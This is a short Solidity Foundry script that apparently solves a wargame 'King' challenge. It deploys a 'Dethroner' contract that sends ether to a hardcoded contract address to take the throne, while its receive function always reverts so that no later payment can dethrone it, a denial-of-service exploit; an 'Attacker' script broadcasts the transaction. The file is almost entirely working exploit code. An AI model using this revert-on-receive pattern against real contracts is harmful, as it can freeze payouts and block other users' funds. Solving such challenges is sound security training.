// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract Dethroner {
    function dethrone()
        public
        payable
    {
        address payable _king = payable(0x89d52c575A0527334Cc86e50362f0d8503B37611);
        // improvenment: don't assume contract has fund.
        (bool _success, ) = _king.call{value: msg.value}("");
        require(_success, "ERR_CALL");
    }
    receive() external payable {revert();}
}

contract Attacker is Script
{
    function run()
        public
    {
        vm.startBroadcast();
        Dethroner _d = new Dethroner();
        _d.dethrone{value: 2000000000000000}();
        vm.stopBroadcast();        
    }
}
